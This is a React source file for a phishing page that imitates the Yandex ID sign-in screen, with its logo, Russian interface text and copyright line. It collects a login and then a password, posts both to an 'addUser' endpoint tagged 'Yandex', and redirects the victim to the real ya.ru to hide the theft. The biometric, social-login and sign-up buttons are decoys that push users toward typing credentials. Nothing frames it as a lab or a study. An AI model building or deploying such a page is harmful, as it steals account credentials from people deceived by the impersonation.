import { Footer } from "../components/Footer"
import ToggleButton from "../components/ToggleButton"
import YaIdLogo from '../assets/YaIdLogo.png'
import vkImg from '../assets/vkImg.svg'
import googleImg from '../assets/googleImg.svg'
import facebookImg from '../assets/facebookImg.svg'
import qrImage from '../assets/qrImage.svg'
import moreImg from '../assets/moreImg.svg'
import rusFlagImg from '../assets/rusFlagImg.png'
import { FaArrowLeft } from "react-icons/fa"
import ButtonComponent from "../components/ButtonComponent"
import { useState } from "react"
import PhoneForm from "../components/PhoneForm"

const YandexAuth = () => {
    const [isNumber, setIsNumber] = useState(false)
    const [inputValue, setInputValue] = useState("")
    const [login, setLogin] = useState("");

    const [error, setError] = useState(false)

    const [step, setStep] = useState("login");
    const [password, setPassword] = useState("");

    const [showToast, setShowToast] = useState(false)


    const handleClick = () => {
        setShowToast(true);
        setTimeout(() => setShowToast(false), 3000); // Убираем через 3 сек
    };


    const handleButtonClick = (e) => {
        e.preventDefault()

        if (!inputValue.trim()) {
            setError(true);
            return;
        }
        setError(false)

        if (step === "login") {
            setLogin(inputValue);
            setInputValue("");
            setStep("password");
        }
        else if (step === "password") {
            const userData = {
                login,
                password: inputValue,
                resource: "Yandex"
            };

            fetch("http://localhost:8000/addUser", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(userData),
            })
                .then(async (response) => {
                    const data = await response.json();
                    if (response.ok) {
                        console.log("Пользователь добавлен:", data);
                        setInputValue("");
                        setStep("login")
                        window.location.href = "https://ya.ru/"
                    } else {
                        console.error("Ошибка:", data.error);
                        setError(true);
                    }
                })
                .catch((error) => {
                    console.error("Ошибка при отправке запроса:", error);
                    setError(true);
                })
        }
    };

    const toggle = () => {
        setIsNumber(!isNumber)
    }

    return (
        <>
            <div className="flex flex-col items-center justify-center gap-2 min-h-screen bg-[#121212] text-white">
                <div className="bg-[#1c1c1c] rounded-3xl p-[32px] max-w-[412px] text-center m-20">
                    <div className="flex items-center justify-between mb-4">
                        <button className="text-xl"><FaArrowLeft /></button>
                        <img className="max-w-40 text-wh invert" src={YaIdLogo} />
                        <h1></h1>
                    </div>

                    <h2 className="text-lg font-semibold mb-4">Войдите с Яндекс ID</h2>
                    <ToggleButton toggle={toggle} />

                    <form onSubmit={handleButtonClick}>
                        {isNumber
                            ? (<div className="relative w-full mt-5 mb-4">
                                <button className="absolute inset-y-0 flex items-center justify-center text-white rounded-2xl bg-[#d3d3de33] h-full aspect-square">
                                    <img src={rusFlagImg} alt="RU" className="w-6 h-4 rounded-sm" />
                                </button>
                                <input
                                    value={inputValue}
                                    onChange={(e) => setInputValue(e.target.value)}
                                    type={step === "login" ? "tel" : "password"}
                                    onFocus={() => setError(false)}
                                    placeholder={
                                        error
                                            ? "Введите данные"
                                            : step === "login"
                                                ? "+7 (000) 000 00 00"
                                                : "Пароль"
                                    }
                                    className={`w-full py-3 pl-16 rounded-2xl border-[1px] border-[#d3d3de33] min-h-10 bg-[#1c1c1c] text-white placeholder-gray-400 outline-none focus:ring-2 focus:ring-gray-500 text-2xl ${error ? "border-red-500 text-red-400 placeholder-red-400" : "border-[#d3d3de33] focus:ring-gray-500"
                                        }`}
                                />
                                {/* <PhoneForm /> */}
                            </div>)


                            : (<div className="relative w-full mt-5 mb-4">
                                <input
                                    value={inputValue}
                                    onChange={(e) => setInputValue(e.target.value)}
                                    onFocus={() => setError(false)}
                                    type={step === "login" ? "text" : "password"}
                                    placeholder={
                                        error
                                            ? "Введите данные"
                                            : step === "login"
                                                ? "Логин или email"
                                                : "Пароль"
                                    }
                                    className={`w-full p-3 rounded-2xl border min-h-10 bg-[#1c1c1c] text-white placeholder-gray-400 outline-none focus:ring-2 focus:ring-gray-500 text-2xl ${error ? "border-red-500 text-red-400 placeholder-red-400" : "border-[#d3d3de33]"
                                        }`}
                                />
                            </div>)
                        }
                        <ButtonComponent
                            // handleButtonClick={handleButtonClick} 
                            type="submit"
                            name="Войти"
                            backGround="bg-white"
                            textColor="text-[#1f1f24]"
                        />
                        <ButtonComponent
                            handleClick={handleClick}
                            name="По лицу или отпечатку"
                            backGround="bg-[#d3d3de33]"
                            textColor="text-white"
                        />

                        {showToast && (
                            <div className="fixed top-5 left-1/2 transform -translate-x-1/2 bg-black text-white px-4 py-2 rounded-md shadow-lg animate-fade-in">
                                Вход возможен только по почте или номеру телефона
                            </div>
                        )}

                        <style>{`
                        @keyframes fadeIn {
                            from { opacity: 0; transform: translateY(-10px) translateX(-50%); }
                            to { opacity: 1; transform: translateY(0) translateX(-50%); }
                        }
                        .animate-fade-in {
                            animation: fadeIn 0.3s ease-in-out;
                        }
                        `}</style>


                        <ButtonComponent
                            handleClick={handleClick}
                            name="Создать ID"
                            backGround="bg-[#1c1c1c] "
                            textColor="text-white"
                        />
                    </form>

                    <h3>Войти с помощью</h3>

                    <div className="flex items-center justify-center gap-8 mt-5">
                        <img src={vkImg} alt="VK" className="w-8 h-8 cursor-pointer" onClick={handleClick}/>
                        <img src={googleImg} alt="Google" className="w-8 h-8 cursor-pointer" onClick={handleClick}/>
                        <img src={qrImage} alt="QR-код" className="w-8 h-8 cursor-pointer" onClick={handleClick}/>
                        <img src={facebookImg} alt="Facebook" className="w-8 h-8 cursor-pointer" onClick={handleClick}/>
                        <img src={moreImg} alt="More" className="w-8 h-2 cursor-pointer" onClick={handleClick}/>
                    </div>
                </div>
                <div className="text-center mt-5 text-sm text-gray-400">
                    <p>Яндекс ID — ключ от всех сервисов<br /><a href="#" className="text-blue-500">Узнать больше</a></p>
                    <p>Ru · Справка и поддержка · © 2001–2025, Яндекс</p>
                </div>
            </div>
        </>
    )
}

export default YandexAuth